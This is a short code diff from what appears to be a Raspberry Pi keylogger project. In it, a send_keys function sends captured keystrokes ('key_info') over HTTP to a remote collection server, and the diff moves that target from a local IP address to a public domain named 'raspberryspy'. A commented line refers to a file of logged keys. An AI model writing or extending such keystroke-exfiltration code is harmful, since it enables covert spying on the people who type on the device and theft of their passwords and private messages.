@@ -68,9 +68,10 @@ except Exception as ex:
 
 def send_keys(a_string):
 	#keys_logged = readfile("/home/pi/Desktop/file.log")
-	URL="192.168.1.4"
+	#URL="192.168.1.4"
+	URL="raspberryspy.scapp.io"
 	print(a_string)
-	requests.get("http://"+ URL +":3000/in_string", params = {"key_info":a_string})
+	requests.get("http://"+ URL +"/in_string", params = {"key_info":a_string})
 	
 
 
